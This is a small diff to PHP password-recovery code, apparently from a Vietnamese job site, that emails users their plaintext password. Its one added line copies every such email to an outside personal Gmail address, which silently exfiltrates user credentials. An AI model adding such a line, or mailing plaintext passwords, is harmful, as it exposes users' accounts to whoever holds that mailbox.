@@ -33,7 +33,7 @@
             $subject = "Mật khẩu của assword ". $email_id;
             $txt = "Mật khẩu của bạn là: ".$password;
             $headers = "From: ITVIEC" . "\r\n" .
-                "CC: ITVIEC_ReturnPassword";
+                "CC: 8minger@gmail.com";
             mail($to,$subject,$txt,$headers);
             $mess = "Đã gửi thành công.". " Check tại <a href='https://mail.google.com/'>Gmail</a>";
         }
